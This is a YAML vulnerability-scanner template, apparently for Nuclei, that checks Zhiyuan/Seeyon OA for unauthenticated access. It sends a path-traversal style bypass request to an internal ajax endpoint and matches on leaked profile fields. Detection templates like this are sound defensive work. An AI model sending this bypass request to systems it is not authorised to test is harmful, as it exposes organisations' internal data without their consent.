id: zhiyuan-oa-unauthorized

info:
  name: Zhiyuan Oa 未授权
  author: pikpikcu
  severity: low
  description: |
    检测到 Zhiyuan Oa 未授权。目标功能在未认证状态下可访问，可能暴露管理入口、业务数据、系统状态或可执行操作，需确认是否存在访问控制缺失。
  reference:
    - https://buaq.net/go-53721.html
  metadata:
    max-request: 1
  tags: seeyon,unauth,zhiyuan,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "serverIdentifier"
          - "companyName"
        condition: and

      - type: word
        words:
          - "application/json"
        part: header

      - type: status
        status:
          - 200
